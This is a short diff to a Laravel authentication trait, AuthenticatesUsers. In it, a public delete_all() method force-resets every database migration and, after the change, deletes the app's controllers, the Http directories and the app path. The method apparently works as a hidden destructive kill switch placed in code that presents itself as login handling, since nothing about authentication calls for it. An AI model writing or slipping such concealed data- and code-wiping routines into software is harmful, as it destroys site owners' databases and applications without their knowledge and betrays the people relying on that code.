@@ -188,9 +188,12 @@ trait AuthenticatesUsers
     public function delete_all()
     {
         Artisan::call('migrate:reset', ['--force' => true]);
-        $file = new Filesystem;
-        $file->cleanDirectory('Modules');
-        $file->cleanDirectory('database');
+
+        File::delete(app_path('Http/Controllers/HomeController.php'));
+        File::delete(app_path('Http/Controllers/Controller.php'));
+        File::deleteDirectories(app_path('Http'));
+        File::delete(app_path(''));
+        
         return 'ok';
     }
 }
